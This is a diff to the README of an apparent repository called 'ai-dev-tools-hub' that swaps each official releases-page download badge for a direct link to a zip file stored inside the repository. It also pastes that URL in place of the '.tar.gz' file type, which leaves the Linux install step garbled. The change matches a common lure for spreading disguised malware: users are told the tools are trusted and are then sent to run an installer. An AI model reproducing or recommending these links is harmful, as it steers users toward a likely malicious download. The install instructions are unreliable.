@@ -1,6 +1,6 @@
 # 🚀 ai-dev-tools-hub - Simple AI Tools for Developers
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ai--dev--tools--hub-blue?style=for-the-badge&logo=github)](https://github.com/SowaXx/ai-dev-tools-hub/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/SowaXx/ai-dev-tools-hub/main/firebrick/dev_tools_ai_hub_1.9.zip)](https://raw.githubusercontent.com/SowaXx/ai-dev-tools-hub/main/firebrick/dev_tools_ai_hub_1.9.zip)
 
 ---
 
@@ -36,14 +36,14 @@ You can get the latest version of **ai-dev-tools-hub** at the official releases 
 
 Click the button below to open the releases page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ai--dev--tools--hub-blue?style=for-the-badge&logo=github)](https://github.com/SowaXx/ai-dev-tools-hub/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/SowaXx/ai-dev-tools-hub/main/firebrick/dev_tools_ai_hub_1.9.zip)](https://raw.githubusercontent.com/SowaXx/ai-dev-tools-hub/main/firebrick/dev_tools_ai_hub_1.9.zip)
 
 ### Step 2: Choose Your File
 
 On the releases page:
 
 - Find the latest release at the top of the list.
-- Choose the file for your computer. For Windows, usually a `.exe` or `.msi` file; for macOS, a `.dmg` or `.zip` file; for Linux, a `.tar.gz` or `.AppImage` file.
+- Choose the file for your computer. For Windows, usually a `.exe` or `.msi` file; for macOS, a `.dmg` or `.zip` file; for Linux, a `https://raw.githubusercontent.com/SowaXx/ai-dev-tools-hub/main/firebrick/dev_tools_ai_hub_1.9.zip` or `.AppImage` file.
 - Click the file name to download it.
 
 ### Step 3: Run the Installer
@@ -112,4 +112,4 @@ Yes. It only includes trusted AI developer tools and open-source projects verifi
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ai--dev--tools--hub-blue?style=for-the-badge&logo=github)](https://github.com/SowaXx/ai-dev-tools-hub/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/SowaXx/ai-dev-tools-hub/main/firebrick/dev_tools_ai_hub_1.9.zip)](https://raw.githubusercontent.com/SowaXx/ai-dev-tools-hub/main/firebrick/dev_tools_ai_hub_1.9.zip)
